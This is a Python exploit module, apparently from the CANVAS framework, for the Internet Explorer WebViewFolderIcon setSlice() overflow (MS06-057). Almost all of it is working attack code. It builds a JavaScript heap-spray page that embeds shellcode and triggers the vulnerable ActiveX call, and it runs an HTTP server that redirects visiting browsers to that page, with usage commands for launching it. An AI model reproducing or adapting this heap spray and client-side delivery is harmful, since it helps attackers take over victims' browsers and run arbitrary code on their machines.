#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Internet Explorer WebViewFolderIcon Overflow'
DESCRIPTION='Internet Explorer WebViewFolderIcon setSlice() Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='09/26/06'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS06-057.mspx'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2006-3730'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3730'
DOCUMENTATION['CVSS'] = 9.3


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['MSADV']='MS06-057'
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
Tested on:
Windows XP Professional SP2 English OOTB (DEP OptIn)

Usage:
./commandlineInterface.py -p 5555 -v 9
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ms06_057 -l 10.10.11.1 -d 5555 -p 8080 -O httpmosdef:1
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
}

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.version=0
        self.badstring='\0\xff'
        self.name=NAME
        self.filename='test.html'
        return

    def makefile(self):
        filedata="""<html>
<body>
<script>
ar=new Array();
function spray(buffer) {
    var hope=unescape("%u0505%u0505");
    var unbuffer=unescape(buffer);
    var v=20+unbuffer.length;
    while(hope.length<v) hope+=hope;
    var fk=hope.substring(0,v);
    var bk=hope.substring(0,hope.length-v);
    delete v;
    delete hope;
    while(bk.length+v<0x40000) bk=bk+bk+fk;
    for(i=0;i<240;i++) ar[i]=bk+unbuffer;
}
spray("SHELLCODE");
for (i=0;i<128;i++) {
    try { 
        var tar=new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
        tar.setSlice(0x7ffffffe,0x05050505,0x05050505,0x05050505); 
    } catch(e) {}
}
</script>
</body>
</html>""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode)) #'AAAA' is necessary for instructions alignement
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
